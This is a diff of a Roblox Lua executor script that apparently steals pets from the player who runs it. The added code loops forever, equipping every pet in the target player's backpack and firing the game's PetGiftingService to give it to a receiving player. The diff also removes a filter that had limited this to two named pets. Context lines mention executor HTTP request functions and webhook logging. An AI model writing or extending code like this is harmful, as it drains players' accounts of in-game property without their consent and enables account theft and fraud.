@@ -218,7 +218,6 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
                         return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                     end
 
-
                     local age = getAge(tool.Name) or 0
                     local weight = getWeight(tool.Name) or 0
                     
@@ -677,70 +676,51 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
--- Daftar pet yang boleh digift
-local AllowedGiftPets = {
-    ["Mega Kitsune"] = true,
-    ["Mimic Octopus"] = true,
-    -- Tambahkan pet lain sesuai keinginan
-}
+        -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
+        local function giftHeldPet()
+            local char = targetPlr.Character
+            if not char then return false end
+            local held = char:FindFirstChildWhichIsA("Tool")
+            if not held then return false end
 
--- Fungsi untuk cek apakah pet boleh digift
-local function IsPetAllowed(petName)
-    return AllowedGiftPets[petName] == true
-end
+            local success, err = pcall(function()
+                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+            end)
 
--- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
-local function giftHeldPet()
-    local char = targetPlr.Character
-    if not char then return false end
-    local held = char:FindFirstChildWhichIsA("Tool")
-    if not held then return false end
-
-    local success, err = pcall(function()
-        RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
-    end)
-
-    if success then
-        print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
-        return true
-    else
-        warn("Gift failed:", err)
-        return false
-    end
-end
-
--- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-task.spawn(function()
-    while true do
-        task.wait(2)  -- Re-scan every 2 seconds
-        local currentPets = GetPlayerPets()
-        if #currentPets == 0 then continue end
-
-        for _, pet in ipairs(currentPets) do
-            
-            -- 🔥 FILTER START (perbaikan: pakai pet.PetName)
-            if not IsPetAllowed(pet.PetName) then
-                continue
+            if success then
+                print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
+                return true
+            else
+                warn("Gift failed:", err)
+                return false
             end
-            -- 🔥 FILTER END
+        end
 
-            for _, tool in targetPlr.Backpack:GetChildren() do
-                if tool:IsA("Tool")
-                and tool:GetAttribute("ItemType") == "Pet"
-                and tool:GetAttribute("PET_UUID") == pet.Id then
+        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
+        task.spawn(function()
+            while true do
+                task.wait(2)  -- Re-scan every 2 seconds
+                local currentPets = GetPlayerPets()
+                if #currentPets == 0 then continue end
 
-                    print("Equipping & gifting:", tool.Name)
-                    targetPlr.Character.Humanoid:EquipTool(tool)
-                    task.wait(0.6)
+                for _, pet in ipairs(currentPets) do
+                    for _, tool in targetPlr.Backpack:GetChildren() do
+                        if tool:IsA("Tool")
+                        and tool:GetAttribute("ItemType") == "Pet"
+                        and tool:GetAttribute("PET_UUID") == pet.Id then
 
-                    for i = 1, 3 do
-                        if giftHeldPet() then
-                            break
+                            print("Equipping & gifting:", tool.Name)
+                            targetPlr.Character.Humanoid:EquipTool(tool)
+                            task.wait(0.6)
+
+                            for i = 1, 3 do
+                                if giftHeldPet() then
+                                    break
+                                end
+                                task.wait(0.3)
+                            end
                         end
-                        task.wait(0.3)
                     end
                 end
             end
-        end
-    end
-end)
+        end)
